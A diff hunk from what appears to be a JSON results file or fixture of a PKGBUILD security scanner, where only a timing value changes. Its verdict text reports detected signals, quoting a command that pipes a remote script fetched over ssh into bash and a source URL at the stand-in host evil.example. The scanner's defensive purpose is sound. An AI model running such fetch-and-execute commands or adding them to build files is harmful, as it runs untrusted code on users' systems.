@@ -381,6 +381,6 @@
       "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined, and the installed rules.toml differs from the shipped rule set in a field that changes what a rule detects, so this analysis did not run the checks this version documents. The result describes what was examined, not the whole change. Version unchanged. modified PKGBUILD; added 1 source URL(s). Signals: Fetch Through An Uncatalogued Client: uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | head -c 4000 | bash [X009]; checksum set to SKIP [H001]; build() fetches buildbox from outside the declared source array [H016]; Source URL classified as unknown (https://evil.example/stage.sh) [SOURCE_BUCKET]. Review the diff before building.",
       "version_comparison": ""
     },
-    "wall_clock_ms": 1007
+    "wall_clock_ms": 879
   }
 }
